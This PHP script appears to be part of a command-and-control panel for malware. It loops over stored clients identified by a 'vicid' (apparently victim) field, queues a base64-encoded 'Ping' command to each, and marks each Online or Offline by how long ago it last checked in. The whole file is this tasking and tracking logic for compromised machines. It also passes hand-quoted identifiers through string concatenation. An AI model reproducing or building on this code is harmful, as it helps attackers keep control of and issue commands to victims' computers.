<?php
include_once __DIR__ . '/../classes/Database.php';
include_once   __DIR__ .'/../classes/Clients.php';

$clients = new Clients;
$allclients = $clients->getClients();

foreach ($allclients as $client) {
	$clients->updateCommands( "'" . $client->vicid . "'" , base64_encode("Ping") );

	$diff = time() - strtotime($client->update_at);
	$hrs = round($diff / 3600);

	if ($hrs >= 1) {
		$clients->updateStatus( "'" . $client->vicid . "'" , "Offline" );
	} else {
		$clients->updateStatus( "'" . $client->vicid . "'" , "Online" );
	}
}
?>